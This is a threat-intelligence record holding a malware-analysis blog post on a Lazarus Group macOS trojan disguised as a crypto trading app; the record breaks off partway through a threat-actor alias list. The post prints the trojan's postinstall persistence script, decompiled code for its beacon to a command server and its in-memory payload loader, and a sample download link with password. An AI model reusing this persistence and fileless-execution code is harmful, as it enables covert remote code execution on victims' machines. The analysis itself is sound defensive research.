{
    "id": "27a4c637-931e-4190-bc8a-b0aa2308881d",
    "created_at": "2023-01-12T15:08:25.867399Z",
    "updated_at": "2025-03-27T02:17:23.697706Z",
    "deleted_at": null,
    "sha1_hash": "2fe21502e92e11d31e26b34422f2b543d652e30e",
    "title": "2019-12-03 - Lazarus Group Goes 'Fileless'",
    "authors": "",
    "file_creation_date": "2022-05-28T17:04:38Z",
    "file_modification_date": "2022-05-28T17:04:38Z",
    "file_size": 2632116,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x51.html**\n\nLazarus Group Goes 'Fileless'\n\nan implant w/ remote download & in-memory execution\n\nby: Patrick Wardle / December 3, 2019\n\nOur research, tools, and writing, are supported by \"Friends of Objective-See\" such as:\n\n[CleanMy Mac X](https://macpaw.com/cleanmymac)\n\nMalwarebytes\nAiro AV\n\n[Become a Friend!](https://objective-see.com/friends.html)\n\\ \\\nüìù üëæ Want to play along?\n[I‚Äôve added the sample (‚ÄòOSX.AppleJeus.C‚Äô) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/AppleJeus.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\nToday, [Dinesh_Devadoss posted a tweet about another Lazarus group macOS trojan:](https://twitter.com/dineshdina04/)\n\n[Another #Lazarus](https://twitter.com/hashtag/Lazarus?src=hash&ref_src=twsrc%5Etfw) [#macOS](https://twitter.com/hashtag/macOS?src=hash&ref_src=twsrc%5Etfw) [#trojan](https://twitter.com/hashtag/trojan?src=hash&ref_src=twsrc%5Etfw)\n\nmd5: 6588d262529dc372c400bef8478c2eec\n\nhxxps://unioncrypto.vip/\n\nContains code: Loads Mach-O from memory and execute it / Writes to a file and\n[execute it@patrickwardle](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw) [@thomasareed](https://twitter.com/thomasareed?ref_src=twsrc%5Etfw) [pic.twitter.com/Mpru8FHELi](https://t.co/Mpru8FHELi)\n\n[‚Äî Dinesh_Devadoss (@dineshdina04) December 3, 2019](https://twitter.com/dineshdina04/status/1201834142704394242?ref_src=twsrc%5Etfw)\n\n[As I‚Äôd recently written about a Lazarus group first stage implant (see: ‚ÄúPass the AppleJeus‚Äù),](https://objective-see.com/blog/blog_0x49.html)\nI was intrigued to analyze this sample!\n\n\n-----\n\nWe ll see while there are some clear overlaps, this (new) sample contains a rather\nsophisticated capabilities, which I‚Äôve never seen before in (public) macOS malware!\n\nThe Lazarus Group has recently been quite active in the macOS space. To read more about\ntheir past activity, see:\n\n‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange w/ fake installer &\nmacOS malware‚Äù \\\n\n[‚ÄúMac Malware that Spoofs Trading App Steals User Information, Uploads it to Website‚Äù](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/)\n\\\n\n[‚ÄúDetecting macOS.GMERA Malware Through Behavioral Inspection‚Äù \\](https://www.sentinelone.com/blog/detecting-macos-gmera-malware-through-behavioral-inspection/)\n\n[‚ÄúPass the AppleJeus‚Äù](https://objective-see.com/blog/blog_0x49.html)\n\n## Infection Vector\n\nIn his [tweet, Dinesh kindly provided an MD5 hash:](https://twitter.com/dineshdina04/status/1201834142704394242) `6588d262529dc372c400bef8478c2eec`\nwhich allows us to locate the sample ( UnionCryptoTrader.dmg ) on VirusTotal, where it‚Äôs\n[only flagged as malicious by two of the engines. (See: UnionCryptoTrader.dmg on](https://www.virustotal.com/gui/file/2ab58b7ce583402bf4cbc90bee643ba5f9503461f91574845264d4f7e3ccb390/detection)\nVirusTotal).\n\nFrom the URL provided in Dinesh‚Äôs [tweet, ( https://unioncrypto.vip/ ) and spelunking](https://twitter.com/dineshdina04/status/1201834142704394242)\naround on VirusTotal, we can gain an understanding of the infection mechanism.\n\nLazarus Group has a propensity for targeting users or administrators of crypto-currency\nexchanges. And their de facto method of infecting such targets is via fake crypto-currency\ncompany and trading applications.\n\nAs part of my recent RSA [presentation I highlighted their attack vector: \\](https://www.rsaconference.com/industry-topics/presentation/whats-your-game-plan-leveraging-apples-game-engine-to-detect-threats)\n\n\n-----\n\nIn this specific attack, Lazarus group created a new website, `unioncrypto.vip : \\`\n\nPinging this site reveals that it‚Äôs still online, and resolving to `104.168.167.16 :`\n```\n$ ping unioncrypto.vip\nPING unioncrypto.vip (104.168.167.16): 56 data bytes\n64 bytes from 104.168.167.16: icmp_seq=0 ttl=112 time=91.483 ms\n\n```\n[Querying VirusTotal with this IP address, we find a URL request that triggered a download of](https://www.virustotal.com/gui/url/1b3d9c75fd1f2e738011997d91cd959156af9c11d391a91fe5cb2b4562accce4/detection)\nthe malicious application\n( https://www.unioncrypto.vip/download/W6c2dq8By7luMhCmya2v97YeN ):\n\n\n-----\n\nIt seems reasonable to assume that Lazarus Group is sticking with its successful attack\nvector (of targeting employees of crypto-currency exchanges with trojanized trading\napplications) ‚Ä¶for now!\n\n## Analysis (Persistence)\n\nLet‚Äôs begin analysis of the trojanzied application. Said application is delivered via a disk\nimage, named `UnionCryptoTrader.dmg We can mount this disk image, via the` `hdiutil`\n```\nattach command:\n$ hdiutil attach ~/Downloads/UnionCryptoTrader.dmg \nexpected  CRC32 $7720DF1C\n/dev/disk4      GUID_partition_scheme      \n/dev/disk4s1     Apple_APFS           \n/dev/disk5      EF57347C-0000-11AA-AA11-0030654 \n/dev/disk5s1     41504653-0000-11AA-AA11-0030654 /Volumes/UnionCryptoTrader\n\n```\nIt contains a single package: `UnionCryptoTrader.pkg :`\n```\n$ ls -lart /Volumes/UnionCryptoTrader\ntotal 40120\n-rwxrwxrwx 1 patrick staff 20538265 Sep 4 06:25 UnionCryptoTrader.pkg\n\n```\nVia our [‚ÄúWhatsYourSign‚Äù application, it‚Äôs easy to see the](https://objective-see.com/products/whatsyoursign.html) `UnionCryptoTrader.pkg`\npackage is unsigned:\n\n\n-----\n\n‚Ä¶which means macOS will warn the user, if they attempt to open it:\n\nTaking a peek at the package, uncovers a `postinstall script that will be executed at the`\nend of the installation process:\n```\n 1#!/bin/sh\n 2mv /Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist \n 3  /Library/LaunchDaemons/vip.unioncrypto.plist\n 4\n 5chmod 644 /Library/LaunchDaemons/vip.unioncrypto.plist\n 6mkdir /Library/UnionCrypto\n 7\n 8mv /Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater \n 9  /Library/UnionCrypto/unioncryptoupdater\n10\n11chmod +x /Library/UnionCrypto/unioncryptoupdater\n12/Library/UnionCrypto/unioncryptoupdater &\n\n```\nThe purpose of this script is to persistently install a launch daemon.\n\nSpecifically, the script will:\n\n\n-----\n\nmove a hidden plist ( .vip.unioncrypto.plist ) from the application s `Resources`\ndirectory into `/Library/LaunchDaemons`\n\nset it to be owned by root\n\ncreate a `/Library/UnionCrypto directory`\n\nmove a hidden binary ( .unioncryptoupdater ) from the application‚Äôs `Resources`\ndirectory into `/Library/UnionCrypto/`\n\nset it to be executable\n\nexecute this binary ( /Library/UnionCrypto/unioncryptoupdater )\n\n[We can passively observe this part of the installation via either our File or](https://objective-see.com/products/utilities.html#FileMonitor) [Process monitors:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n   \"mv\",\n\"/Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist\",\n   \"/Library/LaunchDaemons/vip.unioncrypto.plist\"\n  ],\n  \"ppid\" : 3457,\n  \"ancestors\" : [\n   3457,\n   951,\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 603996161,\n   \"signatureIdentifier\" : \"com.apple.mv\",\n   \"cdHash\" : \"7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD\",\n   \"isPlatformBinary\" : 1\n  },\n  \"path\" : \"/bin/mv\",\n  \"pid\" : 3458\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n   \"mv\",\n   \"/Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater\",\n   \"/Library/UnionCrypto/unioncryptoupdater\"\n  ],\n  \"ppid\" : 3457,\n  \"ancestors\" : [\n   3457,\n   951,\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 603996161,\n   \"signatureIdentifier\" : \"com.apple.mv\",\n   \"cdHash\" : \"7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD\",\n   \"isPlatformBinary\" : 1\n  },\n  \"path\" : \"/bin/mv\",\n  \"pid\" : 3461\n\n```\n\n-----\n\n```\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n   \"/Library/UnionCrypto/unioncryptoupdater\"\n  ],\n  \"ppid\" : 1,\n  \"ancestors\" : [\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 536870919,\n   \"signatureIdentifier\" : \"macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392\",\n   \"cdHash\" : \"8D204E5B7AE08E80B728DE675AEB8CC735CCF6E7\",\n   \"isPlatformBinary\" : 0\n  },\n  \"path\" : \"/Library/UnionCrypto/unioncryptoupdater\",\n  \"pid\" : 3463\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n\n```\nThough installing a launch daemon requires root access, the installer will prompt the user for\ntheir credentials:\n\nOnce the installer completes, the binary `unioncryptoupdater will both currently`\nexecuting, and persistently installed:\n```\n$ ps aux | grep [u]nioncryptoupdater\nroot 1254 /Library/UnionCrypto/unioncryptoupdater\n\n```\n\n-----\n\nOf course, [BlockBlock will detect the launch daemon persistence attempt:](https://objective-see.com/products/blockblock.html)\n\nAs noted, persistence is achieved via the `vip.unioncrypto.plist launch daemon:`\n```\n 1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3<plist version=\"1.0\">\n 4<dict>\n 5  <key>Label</key>\n 6  <string>vip.unioncrypto.product</string>\n 7  <key>ProgramArguments</key>\n 8  <array>\n 9      <string>/Library/UnionCrypto/unioncryptoupdater</string>\n10  </array>\n11  <key>RunAtLoad</key>\n12  <true/>\n13</dict>\n14</plist>\n\n```\nAs the `RunAtLoad key is set to` `true this instruct macOS to automatically launch the`\nbinary specified in the `ProgramArguments array each time the infected system is rebooted.`\nAs such `/Library/UnionCrypto/unioncryptoupdater will be automatically (re)`\nexecuted.\n\nInstalling a launch daemon (who‚Äôs plist and binary were both stored hidden in the\napplication‚Äôs resource directory) again matches Lazarus groups modus operandi.\n\nSee Kaspersky‚Äôs writeup: ‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange with\nfake installer and macOS malware‚Äù\n\n## Analysis (Capabilities)\n\nOk, time to analyze the persisted `unioncryptoupdater binary.`\n\n\n-----\n\nVia the `file command we can ascertain its a standard macOS (64bit) binary:`\n```\n$ file /Library/UnionCrypto/unioncryptoupdater \n/Library/UnionCrypto/unioncryptoupdater: Mach-O 64-bit executable x86_64\n\n```\nThe `codesign utility shows us both it identifier ( macloader-`\n```\n55554944ee2cb96a1f5132ce8788c3fe0dfe7392 ) and the fact that it‚Äôs not signed with a\n\n```\nvalid code signing id, but rather adhoc ( Signature=adhoc ):\n```\n$ codesign -dvv /Library/UnionCrypto/unioncryptoupdater \nExecutable=/Library/UnionCrypto/unioncryptoupdater\nIdentifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392\nFormat=Mach-O thin (x86_64)\nCodeDirectory v=20100 size=739 flags=0x2(adhoc) hashes=15+5 location=embedded\nSignature=adhoc\nInfo.plist=not bound\nTeamIdentifier=not set\nSealed Resources=none\nInternal requirements count=0 size=12\n\n```\nRunning the `strings utility (with the` `-a flag) reveals some interesting strings:`\n\n\n-----\n\n```\n$ strings a /Library/UnionCrypto/unioncryptoupdater \ncurl_easy_perform() failed: %s\nAES_CYPHER_128 encrypt test case:\nAES_CYPHER_128 decrypt test case:\nAES_CYPHER_192 encrypt test case:\nAES_CYPHER_192 decrypt test case:\nAES_CYPHER_256 encrypt test case:\nAES_CYPHER_256 decrypt test case:\nInput:\nIOPlatformExpertDevice\nIOPlatformSerialNumber\n/System/Library/CoreServices/SystemVersion.plist\nProductVersion\nProductBuildVersion\nMac OS X %s (%s)\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n/tmp/updater\n%s %s\nNO_ID\n%s%s\n12GWAPCT1F0I1S14\nauth_timestamp\nauth_signature\ncheck\nhttps://unioncrypto.vip/update\ndone\n/bin/rcp\nCould not create image.\nCould not link image.\nCould not find ec.\nCould not resolve symbol: _sym[25] == 0x4d6d6f72.\nCould not resolve symbol: _sym[4] == 0x4d6b6e69.\n\n```\nStrings such as `IOPlatformSerialNumber and reference to the` `SystemVersion.plist`\nlikely indicate basic survey capabilities (to gather information about the infected system). The\nreference to `libcurl API ( curl_easy_perform ) and embedded url`\n```\nhttps://unioncrypto.vip/update indicate networking and/or command and control\n\n```\ncapabilities.\n\nOpening a the binary ( unioncryptoupdater ) in a disassembler, shows the `main function`\nsimply invoking a function named `onRun :`\n```\n1int _main() {\n2  rbx = objc_autoreleasePoolPush();\n3  \n4  onRun();\n5  \n6  objc_autoreleasePoolPop(rbx);\n7  return 0x0;\n8}\n\n```\nThough rather long and involved we can break down its logic.\n\n\n-----\n\n1. Instantiate a C++ class named Barbeque: `Barbeque::Barbeque(); By piping the`\n\noutput of the `nm utility into` `c++filt we can dump other methods from the`\n```\n  Barbeque class:\n $ nm unioncryptoupdater | c++filt\n unsigned short Barbeque::Barbeque()\n unsigned short Barbeque::get( ... )\n unsigned short Barbeque::post( ... )\n unsigned short Barbeque::~Barbeque()\n\n```\nBased on method names, perhaps the `Barbeque class contains network related`\nlogic?\n\\\n\n2. Invokes a function named `getDeviceSerial to retrieve the system serial number via`\n```\n  IOKit ( IOPlatformSerialNumber ):\n  1int __Z15getDeviceSerialPc(int * arg0) {\n  2  \n  3  ...\n  4\n  5  r15 = *(int32_t *)*_kIOMasterPortDefault;\n  6  rax = IOServiceMatching(\"IOPlatformExpertDevice\");\n  7  rax = IOServiceGetMatchingService(r15, rax);\n  8  if (rax != 0x0) {\n  9      rbx = CFStringGetCString(IORegistryEntryCreateCFProperty(rax, \n 10      @\"IOPlatformSerialNumber\", **_kCFAllocatorDefault, 0x0), \n 11      r14, 0x20, 0x8000100) != 0x0 ? 0x1 : 0x0;\n 12      \n 13      IOObjectRelease(rax);\n 14  }\n 15  rax = rbx;\n 16  return rax;\n 17}\n\n```\nDebugging the malware (in a VM), shows this method correctly returns the virtual\nmachine‚Äôs serial number ( VM+nL/ueNmNG ):\n```\n (lldb) x/s $rax\n 0x7ffeefbff810: \"VM+nL/ueNmNG\"\n\n```\n\\\n\n\n-----\n\n3. Invokes a function named `getOSVersion in order to retrieve the OS version, by`\n\nreading the system file, `/System/Library/CoreServices/SystemVersion.plist`\n(which contains various version-related information):\n```\n $ defaults read /System/Library/CoreServices/SystemVersion.plist\n {\n   ProductBuildVersion = 18F132;\n   ProductCopyright = \"1983-2019 Apple Inc.\";\n   ProductName = \"Mac OS X\";\n   ProductUserVisibleVersion = \"10.14.5\";\n   ProductVersion = \"10.14.5\";\n   iOSSupportVersion = \"12.3\";\n }\n\n```\nAgain in the debugger, we can observe the malware retrieving this information\n(specifically the `ProductName,` `ProductUserVisibleVersion, and`\n```\n  ProductBuildVersion ):\n (lldb) x/s 0x7ffeefbff790\n 0x7ffeefbff790: \"Mac OS X 10.14.5 (18F132)\"\n\n```\n4. Builds a string consisting of the time and hardcode value (key?): `12GWAPCT1F0I1S14`\n```\n 1sprintf(&var_130, \"%ld\", time(0x0));\n 2rax = sprintf(&var_1B0, \"%s%s\", &var_130, \"12GWAPCT1F0I1S14\");\n\n```\n\n-----\n\n5. Invokes the `Barbeque::post() method to contact a remote command & control`\n\nserver ( https://unioncrypto.vip/update ): The network logic leverages via\n```\n   libcurl to perform the actual communications:\n   1curl_easy_setopt(*r15, 0x2727);\n   2curl_easy_setopt(*r15, 0x4e2b);\n   3curl_easy_setopt(*r15, 0x2711);\n   4rdi = *r15;\n   5curl_easy_setopt(rdi, 0x271f);\n   6rax = curl_easy_perform(*r15);\n\n```\nOur firewall [LuLu easily detects this connection attempt:](https://objective-see.com/products/lulu.html)\n\n6. If the server responds with the string `\"0\" the malware will sleep for 10 minutes,`\n\nbefore checking in again with the server:\n```\n   1if (std::__1::basic_string ... ::compare(rbx, 0x0, 0xffffffffffffffff, \"0\",\n   0x1) == 0x0) \n   2{ \n   3 sleep(0x258);\n   4 goto connect2Server;\n   5}\n\n```\nOtherwise it will invoke a function to base64 decode the server‚Äôs respond, followed by\na function named `processUpdate to execute a downloaded payload from the server.`\n\nOk, so we‚Äôve got a fairly standard persistent 1 -stage implant which beacons to a remotest\nserver for (likely) a 2nd-stage fully-featured implant.\n\n\nAt this time, while the remote command & control server remains online, it simply it\nresponding with a ‚Äú0‚Äù, meaning no payload is provided :( \\\n\nAs such, we must rely on static analysis methods for the remainder of our analysis.\n\n\n-----\n\nHowever, the is one rather unique aspect of this 1 -stage implant: the ability to execute the\nreceived payload, directly from memory!\n\nLooks take a closer look at how the malware implements this stealthy capability.\n\nRecall that if the server responds with payload (and not a string `\"0\" ), the malware invokes`\nthe `processUpdate function. First the` `processUpdate decrypts said payload (via`\n```\naes_decrypt_cbc ), then invokes a function named load_from_memory .\n1aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40);\n2memcpy(&var_C0, r15, 0x80);\n3rbx = rbx + 0x90;\n4r14 = r14 - 0x90;\n5rax = _load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n\n```\nThe `load_from_memory function first mmaps some memory (with protections:`\nPROT_READ | PROT_WRITE | PROT_EXEC). Then copies the decrypted payload into this\nmemory region, before invoking a function named `memory_exec2 :`\n```\n 1int _load_from_memory(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {\n 2  r14 = arg2;\n 3  r12 = arg1;\n 4  r15 = arg0;\n 5  rax = mmap(0x0, arg1, 0x7, 0x1001, 0xffffffffffffffff, 0x0);\n 6  if (rax != 0xffffffffffffffff) {\n 7      memcpy(rax, r15, r12);\n 8      r14 = _memory_exec2(rax, r12, r14);\n 9      munmap(rax, r12);\n10      rax = r14;\n11  }\n12  else {\n13      rax = 0xffffffffffffffff;\n14  }\n15  return rax;\n16}\n\n```\nThe `memory_exec2 function invokes the Apple API`\n```\nNSCreateObjectFileImageFromMemory to create an ‚Äúobject file image‚Äù from a memory\n\n```\nbuffer (of a mach-O file). Following this, the `NSLinkModule method is called to link the`\n‚Äúobject file image‚Äù.\n```\n1int _memory_exec2(int arg0, int arg1, int arg2) {\n2  \n3  ...\n4  rax = NSCreateObjectFileImageFromMemory(rdi, rsi, &var_58);\n5  \n6  rax = NSLinkModule(var_58, \"core\", 0x3);\n7  \n\n```\n\n-----\n\nAs the layout of an in-memory process image is different from its on disk-in image, one\ncannot simply copy a file into memory and directly execute it. Instead, one must invoke APIs\nsuch as NSCreateObjectFileImageFromMemory and NSLinkModule (which take care of\npreparing the in-memory mapping and linking).\n\nOnce the malware has mapped and linked the downloaded payload, it invokes a function\nnamed `find_macho which appears to search the memory mapping for` `MH_MAGIC_64, the`\n64-bit ‚Äúmach magic number‚Äù in the `mach_header_64 structure ( 0xfeedfacf ):`\n```\n 1int find_macho(int arg0, int arg1, int arg2, int arg3) {\n 2\n 3 ...\n 4\n 5 do {\n 6  ...\n 7  if ((*(int32_t *)__error() == 0x2) && (*(int32_t *)rbx == 0xfeedfacf)) {\n 8    break;\n 9  }\n10   \n11 } while (true);\n12}\n\n```\nOnce the `find_macho method returns, the malware begins parsing the in-memory mach-O`\nfile. It appears to be looking for the address of `LC_MAIN load command ( 0x80000028 ):`\n```\n1if (*(int32_t *)rcx == 0x80000028) goto loc_100006ac7;\n\n```\n[For an in-depth technical discussion of parsing mach-O files, see: ‚ÄúParsing Mach-O Files‚Äù.](https://lowlevelbits.org/parsing-mach-o-files/)\n\nThe `LC_MAIN load command contains information such as the entry point of the mach-O`\nbinary (for example, offset `18177 for the` `unioncryptoupdater binary):`\n\n\n-----\n\nThe malware then retrieves the offset of the entry point (found at offset `0x8 within the`\n```\nLC_MAIN load command), sets up some arguments, then jumps to this address:\n1//rcx points to the `LC_MAIN` load command\n2r8 = r8 + *(rcx + 0x8);\n3...\n4\n5//invoke payload's entry point!\n6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8);\n\n```\nDelightful! Pure in-memory execution of a remotely downloaded payload. ü§© Sexy!\n\nIn 2015, at BlackHat I discussed this method of in-memory file execution as a means to\n[increase stealth and complicate forensics (See: ‚ÄúWriting Bad @$$ Malware for OS X‚Äù):](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)\n\n\n-----\n\n‚Ä¶kinda neat to see it (finally) show up in macOS malware in the wild!\n\nFor more details on in-memory code execution in macOS, see:\n\n[‚ÄúRunning Executables on macOS From Memory‚Äù](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html)\nApple‚Äôs [‚ÄúMemoryBasedBundle‚Äù sample code](https://developer.apple.com/library/archive/samplecode/MemoryBasedBundle/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003518)\n\n\\\n\n[Former #OBTS speaker Felix Seele (@c1truz_) noted that the (in)famous InstallCore adware](https://twitter.com/c1truz_)\nalso (ab)used the NSCreateObjectFileImageFromMemory and NSLinkModule APIs to\nachieve in-memory execution.\n\nInterestingly, the malware has a ‚Äúbackup‚Äù plan if the in-memory code execution fails.\nSpecifically if `load_from_memory does not return 0 (success) it will write out the received`\npayload to `/tmp/updater and then execute it via a call to` `system :`\n```\n 1rax = _load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n 2if(rax != 0x0) {\n 3 fwrite(rbx, r14, 0x1, fopen(\"/tmp/updater\", \"wb\"));\n 4 fclose(rax);\n 5 \n 6 chmod(\"/tmp/updater\", 0x1ff);\n 7 sprintf(&var_4C0, \"%s %s\", \"/tmp/updater\", &var_C0);\n 8 \n 9 rax = system(&var_4C0);\n10 \n11 unlink(\"/tmp/updater\");\n12}\n\n```\n\n-----\n\nAlways good to handle error conditions and have a plan B!\n\n## Conclusion\n\nLazarus group continues to target macOS users with ever evolving capabilities. Today, we\nanalyzed a new sample with the ability to remotely download and execute payloads directly\nfrom memory!\n\nThe good news is the average Mac user doesn‚Äôt have to worry about being targeted by APT\ngroups such as Lazarus. Moreover, as the installer package, `UnionCryptoTrader.pkg is`\nunsigned, macOS will warn any users if they attempt to open it:\n\nHowever, if you do want to manually check if you‚Äôre infected, the following IoCs should help:\n\nLaunch Daemon property list: `/Library/LaunchDaemons/vip.unioncrypto.plist`\nRunning process/binary: `/Library/UnionCrypto/unioncryptoupdater`\n\nOr a tool such as [KnockKnock can also uncover the infection:](https://objective-see.com/products/knockknock.html)\n\n\n-----\n\n\\\n\n‚ù§ Love these blog posts and/or want to support my research and tools? \\ You can support\nthem via my [Patreon](https://www.patreon.com/bePatron?c=701171) page!\n‚Ä¶or better sign up for our [‚ÄúThe Art of Mac Malware Analysis‚Äù class at Objective by the Sea](https://objectivebythesea.com/v3/training.html)\nv3.0! \\\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-03 - Lazarus Group Goes 'Fileless'.pdf"
    ],
    "report_names": [
        "2019-12-03 - Lazarus Group Goes 'Fileless'.pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
